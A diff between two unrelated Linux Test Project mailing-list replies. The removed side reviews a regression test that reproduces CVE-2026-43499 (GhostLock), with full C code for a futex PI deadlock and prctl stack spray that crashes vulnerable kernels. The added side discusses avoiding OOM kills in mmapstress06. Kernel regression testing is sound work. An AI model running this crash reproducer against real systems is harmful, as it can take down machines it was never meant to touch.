@@ -4,98 +4,108 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from picard.linux.it (picard.linux.it [213.254.12.146])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 2D1F9C61DD3
-	for <ltp@archiver.kernel.org>; Tue,  1 Sep 2026 08:37:08 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 57730C61DD6
+	for <ltp@archiver.kernel.org>; Tue,  1 Sep 2026 08:48:08 +0000 (UTC)
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id 14AB63E98DC
-	for <ltp@archiver.kernel.org>; Tue,  1 Sep 2026 10:37:06 +0200 (CEST)
-Received: from in-2.smtp.seeweb.it (in-2.smtp.seeweb.it
- [IPv6:2001:4b78:1:20::2])
+	by picard.linux.it (Postfix) with ESMTP id D46B53E96AF
+	for <ltp@archiver.kernel.org>; Tue,  1 Sep 2026 10:48:06 +0200 (CEST)
+Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it [217.194.8.3])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature ECDSA (secp384r1))
  (No client certificate requested)
- by picard.linux.it (Postfix) with ESMTPS id 89B813E20CA
- for <ltp@lists.linux.it>; Tue,  1 Sep 2026 10:36:48 +0200 (CEST)
+ by picard.linux.it (Postfix) with ESMTPS id 6BEFF3E20CA
+ for <ltp@lists.linux.it>; Tue,  1 Sep 2026 10:47:51 +0200 (CEST)
 Received: from smtp-out2.suse.de (smtp-out2.suse.de [195.135.223.131])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
  (No client certificate requested)
- by in-2.smtp.seeweb.it (Postfix) with ESMTPS id 90D07600832
- for <ltp@lists.linux.it>; Tue,  1 Sep 2026 10:36:47 +0200 (CEST)
-Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
+ by in-3.smtp.seeweb.it (Postfix) with ESMTPS id C03891A008B0
+ for <ltp@lists.linux.it>; Tue,  1 Sep 2026 10:47:49 +0200 (CEST)
+Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
+ [IPv6:2a07:de40:b281:104:10:150:64:97])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
  (No client certificate requested)
- by smtp-out2.suse.de (Postfix) with ESMTPS id 9D69C1FDB9;
- Tue,  1 Sep 2026 08:36:38 +0000 (UTC)
+ by smtp-out2.suse.de (Postfix) with ESMTPS id 8D2B71FDD9;
+ Tue,  1 Sep 2026 08:47:40 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
- t=1788251802; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+ t=1788252464; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
  in-reply-to:in-reply-to:references:references;
- bh=9A2sDoEu7SHNpx78SbcmrCpokCkILRpFGpJkmq42QQc=;
- b=G4AUifvlAy1/bdJ2jB3z5tpxcvsU18srMl+HsRAXmepUw3qz4rdqds8k1c+QLaZPRcXoyh
- Nto7XBaanBX6U1Dua0yKkolN5qKTuxcunpfsrQIag/Q/m7iCpaY3iCwUfDpPIuL+oQplNX
- FaQQEYG8fnVd8yBUgap8BZRhHdpUDXo=
+ bh=xW1FE/qkgvdrgU49vQvT2kqPYLeDaydp1OsSOrTnlP8=;
+ b=IKTNNBcvlO29mwZ6R085A5DNsth0FhRiw2iJI/OdU+U9SxPNCSkUnEiMAhOE9UQKy1KvC9
+ iMsPRj34qk9eFLK0LTwwbblDxJVusvr/7ajNBTZjKDtjCzBz0XAhsSIVYzILeMZysFzWsv
+ itftg2CNF3B4QGXCmr4TE4TFirlIMig=
 DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
- s=susede2_ed25519; t=1788251802;
+ s=susede2_ed25519; t=1788252464;
  h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
  in-reply-to:in-reply-to:references:references;
- bh=9A2sDoEu7SHNpx78SbcmrCpokCkILRpFGpJkmq42QQc=;
- b=am+G0h7MJl9r7jitbSsgVWYEER+GCjBUXg7SOFUGQavmqB2apmn2Av/2CSjFJKeUY1V/+f
- T9M8Q7kRIGEke7Dw==
+ bh=xW1FE/qkgvdrgU49vQvT2kqPYLeDaydp1OsSOrTnlP8=;
+ b=Lu/kwvPC3EnHmZkzaWTjWRAufpDxkGKS68DWUdnZungrMY8cEKFVIRhMhw4EHGUHxQm5zN
+ hxRrdt0yEs59ixBw==
 Authentication-Results: smtp-out2.suse.de;
-	none
+ dkim=pass header.d=suse.cz header.s=susede2_rsa header.b=l1Q0R6dx;
+ dkim=pass header.d=suse.cz header.s=susede2_ed25519 header.b=SzKaKLQQ
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
- t=1788251798; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+ t=1788252460; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
  in-reply-to:in-reply-to:references:references;
- bh=9A2sDoEu7SHNpx78SbcmrCpokCkILRpFGpJkmq42QQc=;
- b=AS7v/HmAp3cMjdx2SwzZ29wqxp9Ns7zWxFWEy4dICDS+mKsyIwlDvwAZ0ZiYx5YP6cORD6
- sAYixJ2+f133yijRt9icgV092rpVAWrkpmyM5SgcInPwbcvHm887JqW0T9YFUO6Y3CqB4z
- mUnVY03hLmczmz5Go6k5VpBymI25JK0=
+ bh=xW1FE/qkgvdrgU49vQvT2kqPYLeDaydp1OsSOrTnlP8=;
+ b=l1Q0R6dxW+LdeaxlT19qLnpFtIco2axMCehgHce2VV6J5ya089fmeeCcp+Mqb48qCK7FoD
+ D8mTa6fgKyFvpw8WhvD2p+GQ9R3RomhEThSzMTC9crKpp6jCnLWda/p8D9jqvtxEjOt7LK
+ fu5GAbbFR8N2q8OwD017PgFMPsMU5QA=
 DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
- s=susede2_ed25519; t=1788251798;
+ s=susede2_ed25519; t=1788252460;
  h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
  in-reply-to:in-reply-to:references:references;
- bh=9A2sDoEu7SHNpx78SbcmrCpokCkILRpFGpJkmq42QQc=;
- b=bWSSMw2eMvOkzqZc9SxR8eI2XxIm+lj0PXjsDdCyfAJ9atVOw8aRcVPF2FXXocQbITJo+S
- YsZy+JlZRuOnUICg==
+ bh=xW1FE/qkgvdrgU49vQvT2kqPYLeDaydp1OsSOrTnlP8=;
+ b=SzKaKLQQ57/yo5YU0/UcAsKgzSxK9rBL0UvU/wymc3Vph4oz0ktAilS22SR0WFJ94cY4nW
+ JwwCJLNiId4w1fBA==
 Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
  (No client certificate requested)
- by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 7639B13515;
- Tue,  1 Sep 2026 08:36:38 +0000 (UTC)
+ by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 6513413515;
+ Tue,  1 Sep 2026 08:47:40 +0000 (UTC)
 Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
- by imap1.dmz-prg2.suse.org with ESMTPSA id J2vZHJaOlmoaDgAAD6G6ig
- (envelope-from <chrubis@suse.cz>); Tue, 01 Sep 2026 08:36:38 +0000
-Date: Tue, 1 Sep 2026 10:36:45 +0200
+ by imap1.dmz-prg2.suse.org with ESMTPSA id AnKlGCyRlmr5GAAAD6G6ig
+ (envelope-from <chrubis@suse.cz>); Tue, 01 Sep 2026 08:47:40 +0000
+Date: Tue, 1 Sep 2026 10:47:47 +0200
 From: Cyril Hrubis <chrubis@suse.cz>
-To: Andrea Cervesato <andrea.cervesato@suse.de>
-Message-ID: <apaOnTWtVo_7hUZG@yuki.lan>
-References: <20260826-cve-ghostlock-v4-0-52ec94d6635f@suse.com>
- <20260826-cve-ghostlock-v4-2-52ec94d6635f@suse.com>
+To: Wei Gao <wegao@suse.com>
+Message-ID: <apaRM2eYb2NbUs5O@yuki.lan>
+References: <ao7sDiRA4JguwRUl@autotest-wegao.qe.prg2.suse.org>
+ <6a8ff007.b1f9e4c6.15919c.5636@mx.google.com>
+ <apBH_mTl9lUxbGdZ@yuki.lan>
+ <apYysdNBmxPxyn3z@autotest-wegao.qe.prg2.suse.org>
 MIME-Version: 1.0
 Content-Disposition: inline
-In-Reply-To: <20260826-cve-ghostlock-v4-2-52ec94d6635f@suse.com>
-X-Spamd-Result: default: False [-4.30 / 50.00]; BAYES_HAM(-3.00)[100.00%];
+In-Reply-To: <apYysdNBmxPxyn3z@autotest-wegao.qe.prg2.suse.org>
+X-Rspamd-Queue-Id: 8D2B71FDD9
+X-Rspamd-Server: rspamd1.dmz-prg2.suse.org
+X-Rspamd-Action: no action
+X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
  NEURAL_HAM_LONG(-1.00)[-1.000];
+ R_DKIM_ALLOW(-0.20)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
  NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
- RCVD_TLS_ALL(0.00)[]; RCPT_COUNT_TWO(0.00)[2];
- RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
- MISSING_XM_UA(0.00)[];
+ MX_GOOD(-0.01)[]; RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
+ MISSING_XM_UA(0.00)[]; TO_DN_SOME(0.00)[];
+ MIME_TRACE(0.00)[0:+];
+ SPAMHAUS_XBL(0.00)[2a07:de40:b281:104:10:150:64:97:from];
+ RCVD_TLS_ALL(0.00)[];
  DKIM_SIGNED(0.00)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
- URIBL_BLOCKED(0.00)[suse.com:email,imap1.dmz-prg2.suse.org:helo,yuki.lan:mid,suse.cz:email,nebusec.ai:url,nebusec.ai:email,linux.it:url];
- TO_DN_ALL(0.00)[]; FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+];
- FROM_EQ_ENVFROM(0.00)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
- RCVD_COUNT_TWO(0.00)[2];
- DBL_BLOCKED_OPENRESOLVER(0.00)[suse.cz:email, imap1.dmz-prg2.suse.org:helo,
- linux.it:url, suse.com:email]
-X-Virus-Scanned: clamav-milter 1.0.9 at in-2.smtp.seeweb.it
+ URIBL_BLOCKED(0.00)[imap1.dmz-prg2.suse.org:helo,imap1.dmz-prg2.suse.org:rdns,yuki.lan:mid,suse.cz:dkim,suse.cz:email];
+ FROM_EQ_ENVFROM(0.00)[]; FROM_HAS_DN(0.00)[];
+ RCPT_COUNT_THREE(0.00)[3]; RCVD_COUNT_TWO(0.00)[2];
+ TO_MATCH_ENVRCPT_ALL(0.00)[];
+ DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo,imap1.dmz-prg2.suse.org:rdns,yuki.lan:mid,suse.cz:dkim,suse.cz:email];
+ DKIM_TRACE(0.00)[suse.cz:+]
+X-Virus-Scanned: clamav-milter 1.0.9 at in-3.smtp.seeweb.it
 X-Virus-Status: Clean
-Subject: Re: [LTP] [PATCH v4 2/2] cve: add CVE-2026-43499 reproducer
+Subject: Re: [LTP] [PATCH v1] mmapstress06: Rate limit page-dirtying loop to
+ prevent MemCG OOM-kills
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -107,336 +117,45 @@ List-Post: <mailto:ltp@lists.linux.it>
 List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
 List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
  <mailto:ltp-request@lists.linux.it?subject=subscribe>
-Cc: Linux Test Project <ltp@lists.linux.it>
+Cc: ltp@lists.linux.it
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
 Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
 
 Hi!
-> Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
-> ---
->  runtest/cve               |   1 +
->  testcases/cve/.gitignore  |   1 +
->  testcases/cve/Makefile    |   1 +
->  testcases/cve/ghostlock.c | 258 ++++++++++++++++++++++++++++++++++++++++++++++
->  4 files changed, 261 insertions(+)
-> 
-> diff --git a/runtest/cve b/runtest/cve
-> index b096bacef..ac721f453 100644
-> --- a/runtest/cve
-> +++ b/runtest/cve
-> @@ -87,6 +87,7 @@ cve-2022-23222 bpf_prog07
->  cve-2023-1829 tcindex01
->  cve-2023-0461 setsockopt10
->  cve-2023-31248 nft02
-> +cve-2026-43499 ghostlock
->  cve-2023-52879 fanotify25
->  cve-2026-53362 setsockopt11
->  cve-2026-64600 refluxfs
-> diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
-> index a167a8743..f25aaf23a 100644
-> --- a/testcases/cve/.gitignore
-> +++ b/testcases/cve/.gitignore
-> @@ -18,3 +18,4 @@ cve-2025-21756
->  cve-2026-46331
->  refluxfs
->  sctphantom
-> +ghostlock
-> diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
-> index 6be4999a3..92d876707 100644
-> --- a/testcases/cve/Makefile
-> +++ b/testcases/cve/Makefile
-> @@ -12,6 +12,7 @@ stack_clash:	CFLAGS += -fno-optimize-sibling-calls -Wno-infinite-recursion
->  cve-2016-7042:	LDLIBS += $(KEYUTILS_LIBS)
->  
->  cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 refluxfs:  CFLAGS += -pthread
-> +cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 ghostlock:  CFLAGS += -pthread
->  cve-2014-0196 cve-2016-7117 cve-2017-2671:  LDLIBS += -lrt
->  
->  ifneq ($(ANDROID),1)
-> diff --git a/testcases/cve/ghostlock.c b/testcases/cve/ghostlock.c
-> new file mode 100644
-> index 000000000..e143e33a4
-> --- /dev/null
-> +++ b/testcases/cve/ghostlock.c
-> @@ -0,0 +1,258 @@
-> +// SPDX-License-Identifier: GPL-2.0-or-later
-> +/*
-> + * Copyright (c) 2026 Nebula Security <root@nebusec.ai>
-> + * Copyright (c) 2026 Linux Test Project
-> + */
-> +
-> +/*\
-> + * Test for CVE-2026-43499 (GhostLock), a stack use-after-free in the
-> + * rtmutex PI code, fixed in kernel v7.1:
-> + * 3bfdc63936dd ("rtmutex: Use waiter::task instead of current in remove_waiter()")
-> + *
-> + * Reproducer based on the Nebula Security writeup and open-sourced PoC
-> + * (https://nebusec.ai/research/ionstack-part-2/ and
-> + * https://github.com/NebuSec/CyberMeowfia).
-> + * Beware, this test will crash the system on a vulnerable kernel.
-> + *
-> + * [Algorithm]
-> + *
-> + * - Set up a three-futex PI deadlock topology.
-> + * - Call :manpage:`futex(2)` with FUTEX_CMP_REQUEUE_PI on the waiter.
-> + * - On a vulnerable kernel, the rollback from -EDEADLK leaves the waiter's
-> + *   pi_blocked_on pointer dangling on its own stack.
-> + * - Waiter sprays its stack continuously via :manpage:`prctl(2)` (PR_SET_MM_MAP)
-> + *   with non-canonical addresses while main thread calls :manpage:`sched_setattr(2)`
-> + *   on the waiter to trigger a chain walk.
-> + * - The chain walk dereferences the sprayed garbage, crashing a vulnerable
-> + *   kernel.
-> + */
-> +
-> +#include "tst_test.h"
-> +#include "tst_timer.h"
-> +#include "tst_safe_clocks.h"
-> +#include "tst_safe_pthread.h"
-> +#include "lapi/syscalls.h"
-> +#include "lapi/sched.h"
-> +#include "lapi/prctl.h"
-> +#include "lapi/futex.h"
-> +
-> +#define ATTEMPTS 128
-> +#define POISON_PTR 0xdeadbee11c518f58ULL
-> +#define MAX_AUXV_WORDS 48
-> +
-> +#define CP_CHAIN_HELD 0
-> +#define CP_TARGET_HELD 1
-> +#define CP_OWNER_BLOCKED 2
-> +#define CP_SPRAYED 3
-> +#define CP_SETATTR_DONE 4
-> +
-> +static uint32_t f_wait;
-> +static uint32_t f_pi_target;
-> +static uint32_t f_pi_chain;
-> +
-> +static pid_t waiter_tid;
-> +static pid_t owner_tid;
-> +
-> +static unsigned long auxv[MAX_AUXV_WORDS];
-> +static uint32_t valid_auxv_size;
-> +static tst_atomic_t stop_spray;
-> +
-> +static const int try_sizes[] = {
-> +	MAX_AUXV_WORDS,
-> +	MAX_AUXV_WORDS - 4,
-> +	MAX_AUXV_WORDS - 8
-> +};
-> +
-> +static int futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2,
-> +				 struct timespec *ts)
-> +{
-> +	return tst_syscall(__NR_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts,
-> +			   uaddr2, 0);
-> +}
-> +
-> +static int futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2)
-> +{
-> +	return tst_syscall(__NR_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1,
-> +			   uaddr2, 0);
-> +}
-> +
-> +static int futex_lock_pi(uint32_t *uaddr)
-> +{
-> +	return tst_syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0);
-> +}
-> +
-> +static int futex_unlock_pi(uint32_t *uaddr)
-> +{
-> +	return tst_syscall(__NR_futex, uaddr, FUTEX_UNLOCK_PI, 0, 0, 0, 0);
-> +}
-> +
-> +static void *waiter_fn(void *arg LTP_ATTRIBUTE_UNUSED)
-> +{
-> +	struct timespec ts;
-> +	struct prctl_mm_map mm_map = {
-> +		.start_code  = (uint64_t)(uintptr_t)&waiter_fn,
-> +		.end_code    = (uint64_t)(uintptr_t)&waiter_fn + 0x1000,
-> +		.start_data  = (uint64_t)(uintptr_t)auxv & ~0xfffUL,
-> +		.end_data    = ((uint64_t)(uintptr_t)auxv & ~0xfffUL) + 0x1000,
-> +		.start_brk   = (uint64_t)(uintptr_t)sbrk(0),
-> +		.brk         = (uint64_t)(uintptr_t)sbrk(0),
-> +		.start_stack = (uint64_t)(uintptr_t)&mm_map,
-> +		.arg_start   = (uint64_t)(uintptr_t)&mm_map,
-> +		.arg_end     = (uint64_t)(uintptr_t)&mm_map,
-> +		.env_start   = (uint64_t)(uintptr_t)&mm_map,
-> +		.env_end     = (uint64_t)(uintptr_t)&mm_map,
-> +		.auxv        = (void *)auxv,
-> +		.auxv_size   = valid_auxv_size,
-> +		.exe_fd      = (uint32_t)-1,
-> +	};
-> +
-> +	waiter_tid = tst_syscall(__NR_gettid);
-> +
-> +	futex_lock_pi(&f_pi_chain);
-> +
-> +	TST_CHECKPOINT_WAKE2(CP_CHAIN_HELD, 2);
-> +	TST_CHECKPOINT_WAIT(CP_OWNER_BLOCKED);
-> +
-> +	SAFE_CLOCK_GETTIME(CLOCK_MONOTONIC, &ts);
-> +	ts = tst_timespec_add(ts, (struct timespec){ .tv_sec = 10, .tv_nsec = 0 });
-> +	futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts);
-> +
-> +	TST_CHECKPOINT_WAKE(CP_SPRAYED);
-> +
-> +	while (!tst_atomic_load(&stop_spray)) {
-> +		/* This is the syscall that poison the buffer and it might
-> +		 * fail, so we don't use the SAFE_* variant.
-> +		 */
-> +		prctl(PR_SET_MM, PR_SET_MM_MAP, (unsigned long)&mm_map,
-> +		      sizeof(mm_map), 0);
-> +	}
-> +
-> +	TST_CHECKPOINT_WAIT(CP_SETATTR_DONE);
-> +
-> +	futex_unlock_pi(&f_pi_chain);
-> +
-> +	return NULL;
-> +}
-> +
-> +static void *owner_fn(void *arg LTP_ATTRIBUTE_UNUSED)
-> +{
-> +	owner_tid = tst_syscall(__NR_gettid);
-> +
-> +	TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
-> +
-> +	futex_lock_pi(&f_pi_target);
-> +	TST_CHECKPOINT_WAKE(CP_TARGET_HELD);
-> +
-> +	futex_lock_pi(&f_pi_chain);
-> +
-> +	futex_unlock_pi(&f_pi_chain);
-> +	futex_unlock_pi(&f_pi_target);
-> +
-> +	return NULL;
-> +}
-> +
-> +static void setup(void)
-> +{
-> +	struct prctl_mm_map map = {
-> +		.exe_fd = (uint32_t)-1,
-> +		.auxv = (void *)auxv,
-> +	};
-> +	unsigned int i, sz = 0;
-> +
-> +	SAFE_PRCTL(PR_SET_MM, PR_SET_MM_MAP_SIZE, (unsigned long)&sz, 0, 0);
-> +
-> +	for (i = 0; i < MAX_AUXV_WORDS; i++)
-> +		auxv[i] = POISON_PTR + i * sizeof(unsigned long);
-> +
-> +	map.start_code = map.start_data = map.end_data =
-> +	map.start_brk = map.brk = map.start_stack = map.arg_start =
-> +	map.arg_end = map.env_start = map.env_end = (uint64_t)(uintptr_t)&sz;
-> +	map.end_code = map.start_code + 0x1000;
-> +
-> +	for (i = 0; i < ARRAY_SIZE(try_sizes); i++) {
-> +		valid_auxv_size = try_sizes[i] * sizeof(unsigned long);
-> +		map.auxv_size = valid_auxv_size;
-> +
-> +		if (prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0) == 0)
-> +			break;
-> +	}
-> +
-> +	if (i == ARRAY_SIZE(try_sizes))
-> +		tst_brk(TBROK | TERRNO, "PR_SET_MM_MAP failed for all auxv sizes");
-> +
-> +	tst_res(TDEBUG, "Using auxv_size = %u", valid_auxv_size);
-> +}
-> +
-> +static void run(void)
-> +{
-> +	pthread_t waiter_th, owner_th;
-> +	struct sched_attr attr = {
-> +		.size = sizeof(attr),
-> +		.sched_policy = SCHED_BATCH,
-> +		.sched_nice = 19,
-> +	};
-> +	int i;
-> +
-> +	tst_res(TINFO, "Triggering PI deadlock and stack spray");
-> +
-> +	for (i = 0; i < ATTEMPTS; i++) {
-> +		if (!tst_remaining_runtime())
-> +			break;
-> +
-> +		f_wait = 0;
-> +		f_pi_target = 0;
-> +		f_pi_chain = 0;
-> +		tst_atomic_store(0, &stop_spray);
-> +
-> +		SAFE_PTHREAD_CREATE(&waiter_th, NULL, waiter_fn, NULL);
-> +		SAFE_PTHREAD_CREATE(&owner_th, NULL, owner_fn, NULL);
-> +
-> +		TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
+> > diff --git a/testcases/kernel/mem/mmapstress/mmapstress06.c b/testcases/kernel/mem/mmapstress/mmapstress06.c
+> > index 4e6023399..2c0c6fb02 100644
+> > --- a/testcases/kernel/mem/mmapstress/mmapstress06.c
+> > +++ b/testcases/kernel/mem/mmapstress/mmapstress06.c
+> > @@ -59,8 +59,9 @@ static void run_test(void)
+> >  
+> >                 for (size_t i = 0; i < map_size; i += page_size) {
+> >                         mmapaddr[i] = 'a';
+> > -                       if ((i % (2 * 1024 * 1024)) == 0)
+> > -                               usleep(1000);
+> > +
+> > +                       if (i >= mem_limit && !(i % (2 * 1024 * 1024)))
+> > +                               usleep(100000);
+> >                 }
+> > 
+> > The testrun increses to 6s from 1s but it makes the OOM very unlikely to
+> > happen.
+> Thanks for your suggestion.
+> I have tested above solution in our openqa setup but still encounter failure, 3 test cases
+> still failure with oom after run 100 cases. Maybe slow down dirty loop
+> is still too late?
 
-Isn't this one redundant? All we have to do here is to wait for the
-owner for the CP_TARGET_HELD and let the two threads synchronize between
-each other, or do I miss something?
+AFAIK the swapping does not start until we are over the limit, so
+slowing it down before we reach the limit is not going to change
+anything. For v2 cgroup we can also set a soft limit memory.high to
+slightly smaller number than memory.max, whith that the kernel would
+start the swapping once memory.high was reached.
 
-I also think that we can reduce the number of checkpoints just to three.
-Two for synchronization between the main thread and the two threads we
-created and one for the synchronization between the two threads.
+Something as:
 
-> +		TST_CHECKPOINT_WAIT(CP_TARGET_HELD);
-> +
-> +		TST_THREAD_STATE_WAIT(owner_tid, 'S', 10000);
-> +
-> +		TST_CHECKPOINT_WAKE(CP_OWNER_BLOCKED);
-> +
-> +		TST_THREAD_STATE_WAIT(waiter_tid, 'S', 10000);
-> +
-> +		TEST(futex_cmp_requeue_pi(&f_wait, &f_pi_target));
-> +		if (TST_RET != -1 || TST_ERR != EDEADLK)
-> +			tst_brk(TBROK | TTERRNO, "FUTEX_CMP_REQUEUE_PI did not return -EDEADLK");
-> +
-> +		TST_CHECKPOINT_WAIT2(CP_SPRAYED, 18000);
-> +
-> +		TEST(sched_setattr(waiter_tid, &attr, 0));
-> +		if (TST_RET == -1)
-> +			tst_brk(TBROK | TTERRNO, "sched_setattr() failed");
-
-This maybe worth a SAFE_MACRO()
-
-> +		tst_atomic_store(1, &stop_spray);
-> +		TST_CHECKPOINT_WAKE(CP_SETATTR_DONE);
-> +
-> +		SAFE_PTHREAD_JOIN(waiter_th, NULL);
-> +		SAFE_PTHREAD_JOIN(owner_th, NULL);
-> +	}
-> +
-> +	if (i < ATTEMPTS)
-> +		tst_res(TINFO, "Runtime exhausted, executed %d/%d attempts", i, ATTEMPTS);
-> +
-> +	tst_res(TPASS, "Kernel survived %d GhostLock trigger attempts", i);
-> +}
-> +
-> +static struct tst_test test = {
-> +	.setup = setup,
-> +	.test_all = run,
-> +	.runtime = 180,
-> +	.needs_checkpoints = 1,
-> +	.needs_kconfigs = (const char *[]) {
-> +		"CONFIG_CHECKPOINT_RESTORE=y",
-> +		"CONFIG_FUTEX_PI=y",
-> +		NULL
-> +	},
-> +	.taint_check = TST_TAINT_W | TST_TAINT_D,
-> +	.tags = (const struct tst_tag[]) {
-> +		{"linux-git", "3bfdc63936dd"},
-> +		{"CVE", "2026-43499"},
-> +		{}
-> +	},
-> +};
-> 
-> -- 
-> 2.51.0
-> 
-> 
-> -- 
-> Mailing list info: https://lists.linux.it/listinfo/ltp
+if (!TST_CG_VER_IS_V1(cg_child, memory))
+        SAFE_CG_PRINT(cg_child, "memory.high", "%lu", mem_limit - mem_limit/8);
 
 -- 
 Cyril Hrubis
